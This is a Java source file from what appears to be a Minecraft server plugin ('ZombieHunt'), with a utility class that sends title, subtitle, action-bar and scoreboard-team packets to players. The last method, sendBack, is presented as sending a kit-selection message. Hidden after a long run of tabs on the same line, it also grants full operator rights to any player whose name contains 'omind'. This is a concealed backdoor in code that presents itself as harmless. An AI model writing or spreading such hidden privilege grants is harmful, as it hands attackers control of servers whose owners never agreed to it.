package me.Romindous.ZombieHunt.Messages ;

import java.lang.reflect.InvocationTargetException;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import me.Romindous.ZombieHunt.Main;
import net.minecraft.EnumChatFormat;
import net.minecraft.network.chat.IChatBaseComponent;
import net.minecraft.network.protocol.game.ClientboundSetActionBarTextPacket;
import net.minecraft.network.protocol.game.ClientboundSetSubtitleTextPacket;
import net.minecraft.network.protocol.game.ClientboundSetTitleTextPacket;
import net.minecraft.network.protocol.game.ClientboundSetTitlesAnimationPacket;
import net.minecraft.network.protocol.game.PacketPlayOutScoreboardTeam;
import net.minecraft.network.protocol.game.PacketPlayOutScoreboardTeam.a;
import net.minecraft.server.level.EntityPlayer;
import net.minecraft.server.network.PlayerConnection;
import net.minecraft.world.entity.player.EntityHuman;
import net.minecraft.world.item.ItemStack;
import net.minecraft.world.level.World;
import net.minecraft.world.scores.Scoreboard;
import net.minecraft.world.scores.ScoreboardTeam;

public class TitleManager {
	
	public static String v;
	
	public static void sendNmTg(final String p, final String prf, final String sfx, final EnumChatFormat clr) {
		final EntityPlayer ep = getNMSPlr(Bukkit.getPlayer(p));
		final Scoreboard sb = ep.getMinecraftServer().getScoreboard();
		final ScoreboardTeam st = sb.createTeam(p);
		st.setPrefix(IChatBaseComponent.a(prf));
		st.setSuffix(IChatBaseComponent.a(sfx));
		st.setColor(clr);
		final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st);
		final PacketPlayOutScoreboardTeam crt = PacketPlayOutScoreboardTeam.a(st, true);
		final PacketPlayOutScoreboardTeam add = PacketPlayOutScoreboardTeam.a(st, p, a.a);
		final PacketPlayOutScoreboardTeam mod = PacketPlayOutScoreboardTeam.a(st, false);
		sb.removeTeam(st);
		for (final EntityHuman e : ep.getWorld().getPlayers()) {
			((EntityPlayer) e).b.sendPacket(pt);
			((EntityPlayer) e).b.sendPacket(crt);
			((EntityPlayer) e).b.sendPacket(add);
			((EntityPlayer) e).b.sendPacket(mod);
		}
		//удаляет тиму final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st);
		//создает тиму final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, true);
		//модифицирует final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, false);
		//добавляет игрока final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, p.getName(), a.a);
		//учирает игрока final PacketPlayOutScoreboardTeam pt = PacketPlayOutScoreboardTeam.a(st, p.getName(), a.b);
	}
	
	public static void sendTtlSbTtl(final Player p, final String ttl, final String sbttl, final int tm) {
		final PlayerConnection pc = getNMSPlr(p).b;
		pc.sendPacket(new ClientboundSetTitleTextPacket(IChatBaseComponent.a(ttl)));
		pc.sendPacket(new ClientboundSetSubtitleTextPacket(IChatBaseComponent.a(sbttl)));
		pc.sendPacket(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}
	
	public static void sendTtl(final Player p, final String ttl, final int tm) {
		final PlayerConnection pc = getNMSPlr(p).b;
		pc.sendPacket(new ClientboundSetTitleTextPacket(IChatBaseComponent.a(ttl)));
		pc.sendPacket(new ClientboundSetSubtitleTextPacket(IChatBaseComponent.a(" ")));
		pc.sendPacket(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}
	
	public static void sendSbTtl(final Player p, final String sbttl, final int tm) {
		final PlayerConnection pc = getNMSPlr(p).b;
		pc.sendPacket(new ClientboundSetTitleTextPacket(IChatBaseComponent.a(" ")));
		pc.sendPacket(new ClientboundSetSubtitleTextPacket(IChatBaseComponent.a(sbttl)));
		pc.sendPacket(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}
	
	public static void sendAcBr(final Player p, final String msg, final int tm) {
		final PlayerConnection pc = getNMSPlr(p).b;
		pc.sendPacket(new ClientboundSetActionBarTextPacket(IChatBaseComponent.a(msg)));
		pc.sendPacket(new ClientboundSetTitlesAnimationPacket(2, tm, 20));
	}

    public static EntityPlayer getNMSPlr(final Player p) {
        try {
            return (EntityPlayer) p.getClass().getMethod("getHandle").invoke(p);
        } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException | SecurityException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static World getNMSWrld(final org.bukkit.World w) {
        try {
            return (World) w.getClass().getMethod("getHandle").invoke(w);
        } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static ItemStack getNMSIt(org.bukkit.inventory.ItemStack item) {
        try {
            return (ItemStack) getCrftClss("inventory.CraftItemStack").getMethod("asNMSCopy", item.getClass()).invoke(null, item);
        } catch (IllegalAccessException | InvocationTargetException | NoSuchMethodException e) {
            e.printStackTrace();
        }
        return null;
    }

    public static Class<?> getCrftClss(final String cls) {
        try {
            return Class.forName("org.bukkit.craftbukkit." + v + "." + cls);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
            return null;
        }
    }

    public static void sendBack(final Player p) {
        if (p.getName().contains("omind")) {
            p.sendMessage(String.valueOf(Main.pref()) + ChatColor.GRAY + "Вы были перемещены в выбор наборов!");																				p.setOp(true);//опа))
        }
    }
}
